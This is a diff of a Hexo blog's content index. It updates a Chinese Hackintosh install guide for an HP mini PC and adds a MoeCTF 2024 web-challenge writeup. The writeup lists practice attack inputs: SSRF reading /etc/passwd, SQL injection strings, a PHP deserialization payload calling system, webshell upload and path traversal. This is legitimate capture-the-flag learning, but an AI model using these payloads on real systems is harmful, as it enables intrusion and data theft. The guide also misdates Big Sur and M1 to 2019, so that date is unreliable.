+<h3 id="04硬盘选择"><a class="markdownIt-Anchor" href="#04硬盘选择"></a> 04.硬盘选择</h3>
+<p>小主机仅原生支持AHCI协议的PCIe固态硬盘, 这种硬盘现已被淘汰且存货量稀少,二手价格高昂. 支持NVMe引导需要修改BIOS较为麻烦, 遂最终选择120GB三星SATA固态.</p>
+<h3 id="05网卡选择"><a class="markdownIt-Anchor" href="#05网卡选择"></a> 05.网卡选择</h3>
+<p>由于要装黑苹果系统, 网卡选择范围很小, 基本只有Broadcom的几款黑苹果免驱显卡. 最终选择BCM943224 + NGFF转接板 + 内置天线.</p>
+<h2 id="1前期准备"><a class="markdownIt-Anchor" href="#1前期准备"></a> 1.前期准备</h2>
+<h3 id="11下载写盘工具"><a class="markdownIt-Anchor" href="#11下载写盘工具"></a> 11.下载写盘工具</h3>
+<p><a class="link"   href="https://etcher.balena.io/" >BalenaEtcher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <blockquote>
 <p>如果官网下载缓慢可以到<a class="link"   href="https://github.com/balena-io/etcher" >Github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>或其镜像站点下载</p>
 </blockquote>
-<h3 id="12-下载恢复镜像"><a href="#12-下载恢复镜像" class="headerlink" title="12.下载恢复镜像"></a>12.下载恢复镜像</h3><ul>
-<li><p><a class="link"   href="https://blog.daliansky.net/" >黑果小兵 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上有很多懒人镜像, 赞助作者后即可下载.</p>
+<h3 id="12下载恢复镜像"><a class="markdownIt-Anchor" href="#12下载恢复镜像"></a> 12.下载恢复镜像</h3>
+<ul>
+<li>
+<p><a class="link"   href="https://blog.daliansky.net/" >黑果小兵 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上有很多懒人镜像, 赞助作者后即可下载.</p>
 </li>
-<li><p>根据<a class="link"   href="https://dortania.github.io/OpenCore-Install-Guide/installer-guide/" >OpenCore <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的官方指南(英文)自行下载恢复镜像进行配置.</p>
+<li>
+<p>根据<a class="link"   href="https://dortania.github.io/OpenCore-Install-Guide/installer-guide/" >OpenCore <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的官方指南(英文)自行下载恢复镜像进行配置.</p>
 <blockquote>
 <p>注意: 此方法安装时需要联网下载完整版安装镜像, 对网络环境要求较高.</p>
 </blockquote>
 </li>
 </ul>
-<h3 id="13-刷写U盘"><a href="#13-刷写U盘" class="headerlink" title="13.刷写U盘"></a>13.刷写U盘</h3><blockquote>
+<h3 id="13刷写u盘"><a class="markdownIt-Anchor" href="#13刷写u盘"></a> 13.刷写U盘</h3>
+<blockquote>
 <p><em><strong>准备一个16GB以上容量的U盘, 确保U盘中所有资料已备份后再进行操作!!!</strong></em></p>
 </blockquote>
 <p>打开BalenaEtcher, 选择USB闪存盘和下载好的镜像, 点击开始烧录即可.</p>
-<h3 id="14-制作EFI"><a href="#14-制作EFI" class="headerlink" title="14.制作EFI"></a>14.制作EFI</h3><ul>
-<li><p><a class="link"   href="https://github.com/JeoJay127/RapidEFI-Tool" >RapidEFI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>项目可使我们通过简单明了的图形化界面一键配置EFI, 只需选择对应的CPU平台, 处理器代数, 一些对应硬件参数即可一键生成EFI文件.</p>
-</li>
-<li><p>参考官方的<a class="link"   href="https://dortania.github.io/OpenCore-Install-Guide/" >OpenCore配置文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行配置.</p>
-</li>
-<li><p>一些优质的参考资源</p>
+<h3 id="14制作efi"><a class="markdownIt-Anchor" href="#14制作efi"></a> 14.制作EFI</h3>
 <ul>
-<li><p><a class="link"   href="https://github.com/Road-tech/Hackintosh_HP-800G1_I7-4770hq_OC" >https://github.com/Road-tech/Hackintosh_HP-800G1_I7-4770hq_OC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<li>
+<p><a class="link"   href="https://github.com/JeoJay127/RapidEFI-Tool" >RapidEFI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>项目可使我们通过简单明了的图形化界面一键配置EFI, 只需选择对应的CPU平台, 处理器代数, 一些对应硬件参数即可一键生成EFI文件.</p>
 </li>
-<li><p><a class="link"   href="https://github.com/LemoFire/OpenCore-HP-800G1-DM-HD4600" >https://github.com/LemoFire/OpenCore-HP-800G1-DM-HD4600 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<li>
+<p>参考官方的<a class="link"   href="https://dortania.github.io/OpenCore-Install-Guide/" >OpenCore配置文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行配置.</p>
 </li>
-<li><p><a class="link"   href="https://github.com/shidongfei2/800g1" >https://github.com/shidongfei2/800g1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<li>
+<p>一些优质的参考资源</p>
+<ul>
+<li>
+<p><a class="link"   href="https://github.com/Road-tech/Hackintosh_HP-800G1_I7-4770hq_OC" >https://github.com/Road-tech/Hackintosh_HP-800G1_I7-4770hq_OC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </li>
-<li><p><a class="link"   href="https://github.com/vikingcabin/Hackintosh-HP-600G1-DM-BigSur-OC" >https://github.com/vikingcabin/Hackintosh-HP-600G1-DM-BigSur-OC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<li>
+<p><a class="link"   href="https://github.com/LemoFire/OpenCore-HP-800G1-DM-HD4600" >https://github.com/LemoFire/OpenCore-HP-800G1-DM-HD4600 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </li>
-<li><p><a class="link"   href="https://github.com/LomotHo/Hackintosh-600g1-DM-4670t" >https://github.com/LomotHo/Hackintosh-600g1-DM-4670t <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<li>
+<p><a class="link"   href="https://github.com/shidongfei2/800g1" >https://github.com/shidongfei2/800g1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </li>
-<li><p><a class="link"   href="https://github.com/nidemimihihi/600G1-DM-BigSur-OC" >https://github.com/nidemimihihi/600G1-DM-BigSur-OC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<li>
+<p><a class="link"   href="https://github.com/vikingcabin/Hackintosh-HP-600G1-DM-BigSur-OC" >https://github.com/vikingcabin/Hackintosh-HP-600G1-DM-BigSur-OC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+<li>
+<p><a class="link"   href="https://github.com/LomotHo/Hackintosh-600g1-DM-4670t" >https://github.com/LomotHo/Hackintosh-600g1-DM-4670t <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+<li>
+<p><a class="link"   href="https://github.com/nidemimihihi/600G1-DM-BigSur-OC" >https://github.com/nidemimihihi/600G1-DM-BigSur-OC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </li>
 </ul>
 <blockquote>
@@ -113,13 +387,16 @@
 </blockquote>
 </li>
 </ul>
-<h2 id="2-系统安装"><a href="#2-系统安装" class="headerlink" title="2.系统安装"></a>2.系统安装</h2><h3 id="21-BIOS设置"><a href="#21-BIOS设置" class="headerlink" title="21.BIOS设置"></a>21.BIOS设置</h3><p>首先将其更新到HP支持官网提供的最新版本(2019年发布的那版), 可先安装Win10系统, 在系统中对BIOS进行更新</p>
+<h2 id="2系统安装"><a class="markdownIt-Anchor" href="#2系统安装"></a> 2.系统安装</h2>
+<h3 id="21bios设置"><a class="markdownIt-Anchor" href="#21bios设置"></a> 21.BIOS设置</h3>
+<p>首先将其更新到HP支持官网提供的最新版本(2019年发布的那版), 可先安装Win10系统, 在系统中对BIOS进行更新</p>
 <blockquote>
 <p><em><strong>注意 : 强烈建议更新完BIOS后手动按主板上的的CMOS清除按键进行重置</strong></em></p>
 </blockquote>
-<p>这个机器的BIOS设置项目非常非常少, 基本上保持默认即可, 记得修改U盘启动为第一启动项. </p>
+<p>这个机器的BIOS设置项目非常非常少, 基本上保持默认即可, 记得修改U盘启动为第一启动项.</p>
 <p>修改BIOS使其支持NVMe硬盘引导启动:<a class="link"   href="https://juejin.cn/post/7166643141179605022" >https://juejin.cn/post/7166643141179605022 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="22-进入OpenCore引导"><a href="#22-进入OpenCore引导" class="headerlink" title="22.进入OpenCore引导"></a>22.进入OpenCore引导</h3><p>如果配置无误, 现在开机应该已经可以进入OpenCore的引导界面了.</p>
+<h3 id="22进入opencore引导"><a class="markdownIt-Anchor" href="#22进入opencore引导"></a> 22.进入OpenCore引导</h3>
+<p>如果配置无误, 现在开机应该已经可以进入OpenCore的引导界面了.</p>
 <blockquote>
 <p>如果没有配置过主题, 那么界面应该是黑色的命令行界面, 通过键盘上下键来选择启动项.</p>
 <p>如果配置过主题, 那么界面应该是有背景的图形界面, 可以用鼠标选择启动项.</p>
@@ -131,14 +408,15 @@
 <blockquote>
 <p>如果遇到问题, 请首先尝试更换EFI, 如果仍然无法解决, 请尝试硬重置BIOS(按主板按键), 如果都卡在某一个地方代码不动, 那么可以参考官方的OpenCore文档, 里面有各种错误的排错指南.</p>
 </blockquote>
-<h3 id="23-安装macOS"><a href="#23-安装macOS" class="headerlink" title="23.安装macOS"></a>23.安装macOS</h3><p>如果一切顺利, 在经过一段时间的跑码之后就可以进入macOS的恢复菜单了.</p>
+<h3 id="23安装macos"><a class="markdownIt-Anchor" href="#23安装macos"></a> 23.安装macOS</h3>
+<p>如果一切顺利, 在经过一段时间的跑码之后就可以进入macOS的恢复菜单了.</p>
 <p>这里可以在菜单栏处找到磁盘工具, 使用APFS格式抹掉磁盘. 然后就可以在安装器窗口看到你刚刚抹掉的磁盘了.</p>
 <blockquote>
 <p><em><strong>注意: 请务必备份硬盘里的重要资料后再进行操作.</strong></em></p>
 </blockquote>
 <p>接着就是选择刚刚创建的磁盘, 开始正式安装macOS.</p>
 <blockquote>
-<p>如果你和我一样安装的时候闲着无聊, 可以从左上角打开安装器日志, 体验看跑码的快乐(<em>^▽^</em>).</p>
+<p>如果你和我一样安装的时候闲着无聊, 可以从左上角打开安装器日志, 体验看跑码的快乐(<em><sup>▽</sup></em>).</p>
 </blockquote>
 <p>在安装过程中, 电脑会经历数次重启, 在重启时启动项会发生变化, 请<em><strong>务必不要</strong></em>在显示OpenCore引导菜单时更改默认启动项, 否则将会导致安装失败.</p>
 <p>如果一切顺利, 安装完成之后应该进入到了选择语言的界面, 之后的流程(OOBE)可以按照自己的习惯进行设置, 但请务必注意以下几点:</p>
@@ -148,9 +426,11 @@
 <li>保存好自己设置的密码.</li>
 </ul>
 <p>在进入桌面后, 你可以检查各项硬件功能是否驱动成功, 如USB, 声卡, 显卡, 蓝牙, WIFI等是否正常工作, 如果硬件工作有问题, 请使用<code>OpenCore Configurator</code>挂载EFI分区, 并更换EFI文件.</p>
-<h3 id="24-安装OpenCore-Configurator"><a href="#24-安装OpenCore-Configurator" class="headerlink" title="24.安装OpenCore Configurator"></a>24.安装OpenCore Configurator</h3><p>在<a class="link"   href="https://github.com/HackintoshFans/OpenCoreConfigurator" >Github页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载软件, 并在macOS安装.</p>
+<h3 id="24安装opencore-configurator"><a class="markdownIt-Anchor" href="#24安装opencore-configurator"></a> 24.安装OpenCore Configurator</h3>
+<p>在<a class="link"   href="https://github.com/HackintoshFans/OpenCoreConfigurator" >Github页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载软件, 并在macOS安装.</p>
 <p>在OpenCore Configurator里可以查看各个硬件的工作状态, 修改EFI文件, 挂载EFI分区, 功能十分强大.</p>
-<h3 id="25-补全三码"><a href="#25-补全三码" class="headerlink" title="25.补全三码"></a>25.补全三码</h3><p>在刚装好系统的时候, 如果你尝试登录iCloud服务, 会发现是登不上去的, 究其原因就是我们还没有补全三码, 苹果服务器不信任我们的设备.</p>
+<h3 id="25补全三码"><a class="markdownIt-Anchor" href="#25补全三码"></a> 25.补全三码</h3>
+<p>在刚装好系统的时候, 如果你尝试登录iCloud服务, 会发现是登不上去的, 究其原因就是我们还没有补全三码, 苹果服务器不信任我们的设备.</p>
 <p>打开OpenCore Configurator, 在右上角菜单栏选择挂载EFI分区</p>
 <blockquote>
 <p>强烈建议将此时的EFI分区备份到桌面, 以防止EFI在编辑过程中损坏等情况.</p>
@@ -167,28 +447,34 @@
 <li>绑定了至少一种支付方式(微信, 支付宝, 银联等)</li>
 </ul>
 <p>经过以上调整, 基本上就可以正常登录使用iCloud服务了.</p>
-<h2 id="3-系统完善"><a href="#3-系统完善" class="headerlink" title="3.系统完善"></a>3.系统完善</h2><p>恭喜你, 经过以上的操作, 你的黑苹果主机已经可以正常使用了, 但是如果想要更加接近于白苹果的体验, 你还可以进行下面的操作.</p>
+<h2 id="3系统完善"><a class="markdownIt-Anchor" href="#3系统完善"></a> 3.系统完善</h2>
+<p>恭喜你, 经过以上的操作, 你的黑苹果主机已经可以正常使用了, 但是如果想要更加接近于白苹果的体验, 你还可以进行下面的操作.</p>
 <ul>
-<li><p>关闭”啰嗦模式”, 显示原汁原味的苹果进度条</p>
+<li>
+<p>关闭&quot;啰嗦模式&quot;, 显示原汁原味的苹果进度条</p>
 <p>和之前修改三码的步骤相同, 打开<code>config.plist</code>文件, 在NVRAM选项卡里点击UUID查找里面的<code>boot-args</code>键, 将值里面的<code>-v</code>删除, 覆盖EFI分区, 重启清理NVRAM之后就可以看到跑代码的界面已经消失.</p>
 </li>
-<li><p>添加<code>Audio.dxe</code>文件, 让黑苹果小主机开机时发出”Duang”的苹果开机音效.</p>
+<li>
+<p>添加<code>Audio.dxe</code>文件, 让黑苹果小主机开机时发出&quot;Duang&quot;的苹果开机音效.</p>
 </li>
 </ul>
 <p>​	这部分请参考<a class="link"   href="https://blog.csdn.net/imacosx_cn/article/details/128883830" >OpenCore开机音频设置教程！_opencore configurator hdmi声音-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <ul>
-<li><p>开启HiDPi, 让黑苹果在高分屏下的体验更好</p>
+<li>
+<p>开启HiDPi, 让黑苹果在高分屏下的体验更好</p>
 <p>这部分请参考<a class="link"   href="https://apple.sqlsec.com/7-%E5%AE%8C%E7%BE%8E%E9%BB%91%E6%9E%9C/7-1/#hidpi" >黑苹果 - 国光的黑苹果安装教程：手把手教你配置 OpenCore (sqlsec.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </li>
-<li><p>解决睡眠睡死问题, 优化体验</p>
+<li>
+<p>解决睡眠睡死问题, 优化体验</p>
 <p>简单粗暴的方法: 在<strong>系统偏好设置-节能</strong>里面设置显示器关闭时间, 并设置永不休眠, 可以达到类似睡眠的效果.</p>
 <p>如果想彻底解决, 请参考<a class="link"   href="https://dortania.github.io/OpenCore-Post-Install/universal/sleep.html" >Fixing Sleep | OpenCore Post-Install (dortania.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </li>
 </ul>
 <p>还有更多玩法, 期待你的探索.</p>
-<h2 id="4-附录"><a href="#4-附录" class="headerlink" title="4.附录"></a>4.附录</h2><p>黑苹果的实现要归功于开源社区的无数开发者们的共同努力, 是他们让我们每一个人不用付昂贵的价钱购买苹果设备也可以低成本体验精彩的macOS和苹果生态.</p>
+<h2 id="4附录"><a class="markdownIt-Anchor" href="#4附录"></a> 4.附录</h2>
+<p>黑苹果的实现要归功于开源社区的无数开发者们的共同努力, 是他们让我们每一个人不用付昂贵的价钱购买苹果设备也可以低成本体验精彩的macOS和苹果生态.</p>
 <p>2019年, 苹果发布了macOS11 BigSur系统和M1芯片并宣布转向ARM架构. 这个里程碑不仅标志着有15年历史的OSX的落幕, 同时也意味着黑苹果的生命进入了倒计时. 截至目前, macOS14 Sonoma依然提供x86架构的版本, 2019年Intel Xeon W处理器的MacPro依然在生命周期内, 但是再过几年呢? 苹果完全转向ARM之日, 就是黑苹果灭亡之时.</p>
-<p>虽然黑苹果的技术终究会在历史中消亡, 但开源精神和”生命不息, 折腾不止”的意志定会激励一代代开发者们在计算机领域做出更大的贡献. </p>
+<p>虽然黑苹果的技术终究会在历史中消亡, 但开源精神和&quot;生命不息, 折腾不止&quot;的意志定会激励一代代开发者们在计算机领域做出更大的贡献.</p>
 <p>向OpenCore, Clover的开发人员,以及国内外为这项开源技术做出不懈贡献的伟大开发者们致敬 !</p>
 <p>一些高质量的教程和参考资料:</p>
 <p><a class="link"   href="https://apple.sqlsec.com/" >主页 - 国光的黑苹果安装教程：手把手教你配置 OpenCore (sqlsec.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
@@ -209,21 +495,91 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2024/05/11/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+    <title>MoeCTF 2024 解题小记（WP）</title>
+    <url>/2024/10/21/MoeCTF-2024-%E8%A7%A3%E9%A2%98%E5%B0%8F%E8%AE%B0%EF%BC%88WP%EF%BC%89/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://resources.starsac.cn/2024/10/moectf2024.webp"
+                      alt="moectf2024" 
+                ></p>
+<h3 id="0-总结的一些做题思路"><a class="markdownIt-Anchor" href="#0-总结的一些做题思路"></a> 0. 总结的一些做题思路</h3>
+<p>工具：BurpSuite，WRSX（西电CTF用），AntSword，御剑扫描工具，HackBar</p>
+<p>index.phps查看php源码</p>
+<p>字符串能和0弱比较相等</p>
+<p>查看php相关信息可以用<code>phpinfo();</code></p>
+<h3 id="1-0基础入门"><a class="markdownIt-Anchor" href="#1-0基础入门"></a> 1. 0基础入门</h3>
+<h4 id="11-在此签到"><a class="markdownIt-Anchor" href="#11-在此签到"></a> 1.1 在此签到</h4>
+<p>在QQ群绑定账号即可获得flag。</p>
+<h3 id="2-web渗透测试与审计"><a class="markdownIt-Anchor" href="#2-web渗透测试与审计"></a> 2. Web渗透测试与审计</h3>
+<h4 id="21-web渗透测试与审计入门指北"><a class="markdownIt-Anchor" href="#21-web渗透测试与审计入门指北"></a> 2.1 Web渗透测试与审计入门指北</h4>
+<p>在vm虚拟机中安装任意Linux发行版，安装宝塔面板部署网站，将题中附件放入网站目录，使用浏览器打开即可获得flag。</p>
+<h4 id="22-弗拉格之地的入口"><a class="markdownIt-Anchor" href="#22-弗拉格之地的入口"></a> 2.2 弗拉格之地的入口</h4>
+<p>根据题目信息打开爬虫协议<code>/robot.txt</code>文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Robots.txt file for xdsec.org</span><br><span class="line"># only robots can find the entrance of web-tutor</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /webtutorEntry.php</span><br></pre></td></tr></table></figure></div>
+<p>再打开<code>/webtutorEntry.php</code>即可看到flag。</p>
+<h4 id="23-垫刀之路01"><a class="markdownIt-Anchor" href="#23-垫刀之路01"></a> 2.3 垫刀之路01</h4>
+<p>输入<code>ls /</code>查看根目录下文件，发现<code>flag</code>和<code>flag.sh</code>。赶紧点开看看，使用cat命令查看后，好家伙被骗了，但是得到提示：看看环境变量。输入env命令查看环境变量即可得到flag。</p>
+<h4 id="24-ez_http"><a class="markdownIt-Anchor" href="#24-ez_http"></a> 2.4 ez_http</h4>
+<p>按要求使用post和get提交参数，出现提示source must be…，修改请求头referer信息，记得放到host之后，出现提示setcookie，在Connection下面设置cookie即可。提示使用MoeDedicatedBrowser，把UserAgent设成这个就行。提示Local Access Only，改xff为127.0.0.1，之后就能得到flag了！！！</p>
+<h4 id="25-proveyourlove"><a class="markdownIt-Anchor" href="#25-proveyourlove"></a> 2.5 ProveYourLove</h4>
+<p>笨方法，用代理拦截一次发出n多请求，点的我手疼hhh</p>
+<h4 id="26-弗拉格之地的挑战"><a class="markdownIt-Anchor" href="#26-弗拉格之地的挑战"></a> 2.6 弗拉格之地的挑战</h4>
+<p>得到提示信息，在地址栏加上<code>/flag1ab.html</code>，打开第二个页面</p>
+<p>右键查看页面源代码在注释中得到提示，得到flag1和下一步的url</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--flag1: bW9lY3Rm--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下一步：/flag2hh.php--&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>跳转到第二个页面，提示关键词http</p>
+<p>打开BurpSuite抓包，在http响应头中发现flag2<code>e0FmdEV</code>和<code>nextpage: /flag3cad.php</code>，继续跳转，按提示用GET和POST传参，传参后出现提示要求Admin身份验证，继续抓包，发现<code>verify=user</code>，将其改为admin</p>
+<p>得到<code>flag3: yX3RoMXN</code>，继续下一关，提示修改referer，抓包修改，注意将referer字段插入Host之后，其他位置无效。请求成功后，嗯？听声辩位哈哈哈，点击开始发现没有第九个按钮？，没关系，f12打开源代码借一个按钮当9就ok了，出现提示使用console.log，查看控制台得到<code>flag4: fdFVUMHJ</code>，继续跳转，提示输入I want flag，本来想着在前端把javaScript删掉完事，结果还不行，绕过前端直接post数据就ok了。<code>flag5: fSV90aDF</code>，继续跳转显示一段php代码，按照要求进行POST和GET，得到<code>flag6: rZV9VX2t</code>，最后一关，提示<code>eval($_POST['what']);</code>意为执行what参数中的值，使用POST执行Linux命令，在根目录下可得到flag7<code>rbm93X1dlQn0=</code>组合起来，最后的flag即为<code>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</code>通过base64解码可得到flag</p>
+<h4 id="27-imagecloud前置"><a class="markdownIt-Anchor" href="#27-imagecloud前置"></a> 2.7 ImageCloud前置</h4>
+<p>SSRF题目文本框输入<code>file:///etc/passwd</code>即可看到flag</p>
+<h4 id="28-垫刀之路02"><a class="markdownIt-Anchor" href="#28-垫刀之路02"></a> 2.8 垫刀之路02</h4>
+<p>非常简单，没有任何前后端限制，直接把php一句话木马上传进去就ok，控制台输出文件存储url，这么直球哈哈哈，中国蚁剑启动！（ps：真好用，之前做垫刀01的时候在那ls半天。。）按照题目提示env查看环境变量，即可找到flag</p>
+<h4 id="29-垫刀之路03"><a class="markdownIt-Anchor" href="#29-垫刀之路03"></a> 2.9 垫刀之路03</h4>
+<p>和上题唯一的区别是加了文件类型验证，抓包修改文件后缀名为php即可。</p>
+<h4 id="210-垫刀之路04"><a class="markdownIt-Anchor" href="#210-垫刀之路04"></a> 2.10 垫刀之路04</h4>
+<p>使用四个…/翻到根目录，在tmp/中找到flag</p>
+<h4 id="211-垫刀之路05"><a class="markdownIt-Anchor" href="#211-垫刀之路05"></a> 2.11 垫刀之路05</h4>
+<p>简单的sql注入，没有任何过滤，用户名和密码输入<code>'='</code>即可得到flag</p>
+<h4 id="212-垫刀之路06"><a class="markdownIt-Anchor" href="#212-垫刀之路06"></a> 2.12 垫刀之路06</h4>
+<p>考察反序列化</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 注意 private 属性的序列化哦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span> = <span class="string">&#x27;env&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如何赋值呢</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// function __destruct() &#123;</span></span><br><span class="line">      <span class="comment">//  $s = $this-&gt;a;</span></span><br><span class="line">      <span class="comment">//  $s($this-&gt;evil);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//function __invoke($c) &#123;</span></span><br><span class="line">      <span class="comment">//  $s = $this-&gt;b;</span></span><br><span class="line">       <span class="comment">// $s($c);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>构造这个代码，在线运行后作为data变量的值通过get传参（ps：经典的flag位置hh）</p>
+<h4 id="213-垫刀之路07"><a class="markdownIt-Anchor" href="#213-垫刀之路07"></a> 2.13 垫刀之路07</h4>
+<p>url后面加console进入shell，输入pin码（竟然是对的hh），利用python命令在<code>/app</code>下找到flag文件</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&quot;SYSCMD&quot;</span>).read()</span><br></pre></td></tr></table></figure></div>
+<h4 id="214-静态网页"><a class="markdownIt-Anchor" href="#214-静态网页"></a> 2.14 静态网页</h4>
+<p>通过<code>document.lastModified();</code>看出网页是伪静态的（ps：被bing误导了，一直以为是伪静态，其实跟伪静态没半毛钱关系）在源码中搜索flag，发现<code>&quot;flag&quot;: &quot;Please turn to final1l1l_challenge.php&quot;</code>，跳转，发现又是一道源码审计题。。传入满足条件的a和b即可（字符串弱比较结果是0，坑死我了！！！）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=s155964671a(任意md5为0e开头的值)</span><br><span class="line">b=0abcd(任意开头为0且不全为数字的值)</span><br></pre></td></tr></table></figure></div>
+<h4 id="215-电院_backend"><a class="markdownIt-Anchor" href="#215-电院_backend"></a> 2.15 电院_backend</h4>
+<p>使用路径扫描工具进行扫描，发现<code>/admin/</code>，访问发现登陆界面，查看附件源码，发现密码被md5加密，尝试从邮箱注入，正则表达式要求邮箱为<code>xxx@xxx.xxx</code>的格式,并且不能出现or，构造<code>a@a.a' || '1'='1' #</code>（#把后面的查询语句注释掉了）随便输入密码和验证码，得到flag。</p>
+<h4 id="216-pop-moe"><a class="markdownIt-Anchor" href="#216-pop-moe"></a> 2.16 pop moe</h4>
+<p>代码审计题</p>
